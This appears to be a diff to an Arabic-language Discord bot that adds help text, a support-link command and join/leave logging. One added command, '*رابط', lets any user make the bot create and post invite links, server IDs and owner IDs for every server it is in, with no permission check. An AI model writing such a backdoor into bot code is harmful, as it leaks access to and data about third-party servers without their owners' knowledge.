@@ -505,6 +505,7 @@ msg.delete();
       .addField('*bc' ,':incoming_envelope: رسالة جماعية الى كل اعضاء السيرفر:incoming_envelope: ')
       .addField('*inv' ,':mailbox_with_mail:يتم ارسال رساله لك في الخاص ويوجد بها رابط البوت:mailbox_with_mail:')
       .addField('*موسيقى' ,'     :musical_note:   للحصول على قائمة  الموسيقى :musical_note:  ')
+      .addField('*support' ,'رابط سيرفر الدعم الفني ')
       .addField('welcome' ,':wave:حتى البوت يرحب في الاشخاص يجيب عليك عمل شات باسم『welcome』:wave:')
       .setColor('RANDOM')
       .setTitle('═════ஜ۩۞۩ஜ══════════ஜ۩۞۩ஜ═════')
@@ -538,6 +539,96 @@ http://cutt.us/gamereon_Bot
   message.author.sendEmbed(embed);
    }
 });
+
+
+
+
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '*رابط') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+});
+
+
+
+
+
+
+
+
+
+
+
+
+client.on('guildCreate', guild => {
+         const embed = new Discord.RichEmbed()
+     .setColor("RED")
+     .setTitle('Click Here To Add Bot .!')
+     .setURL('https://discordapp.com/oauth2/authorize?client_id=487424028899016714&scope=bot&permissions=21469585838')
+  .setDescription(`**
+ تم اضافة بوتك في سيرفر جديد ✅
+Server Name: ${guild.name}
+Server Owner: ${guild.owner}
+Server ID: ${guild.id}
+Count: ${guild.memberCount}**`);
+client.channels.get("488002185955639296").sendEmbed(embed)
+});
+
+client.on('guildDelete', guild => {
+         const embed = new Discord.RichEmbed()
+     .setColor("GOLD")
+     .setTitle('Click Here To Add Bot .!')
+     .setURL('https://discordapp.com/oauth2/authorize?client_id=487424028899016714&scope=bot&permissions=21469585838')
+  .setDescription(`**
+  تم تطرد بوتك من سيرفر :cry:
+Server Name: ${guild.name}
+Server Owner: ${guild.owner}
+Server ID: ${guild.id}
+Count: ${guild.memberCount}**`);
+client.channels.get("488002185955639296").sendEmbed(embed)
+});
+
+
+
+
+
+
+
+  client.on('message' , message => {
+
+    if (message.content === "*support") {
+	    message.reply(`تم ارساله الرابط في الخاص`)
+        if(!message.channel.guild) return message.reply('**الآمر فقط في السيرفرات**');
+     const embed = new Discord.RichEmbed()
+ .setColor("RANDOM")
+ .setThumbnail(client.user.avatarURL)     
+ .setDescription(" ***welcome To server support*** " + `
+ **
+رابط السيرفر | https://discord.gg/QMk6frh
+ **
+`);
+  message.author.sendEmbed(embed);
+   }
+});
+
 
 
 
